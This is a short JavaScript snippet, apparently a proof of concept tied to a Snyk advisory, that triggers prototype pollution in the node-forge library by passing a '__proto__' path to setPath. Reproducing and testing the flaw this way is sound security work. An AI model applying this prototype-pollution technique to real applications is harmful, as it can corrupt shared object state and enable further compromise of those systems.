//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
  const nodeforge = require("node-forge");
  const obj = {};
  nodeforge.util.setPath(obj, ["__proto__", "polluted"], "yes");
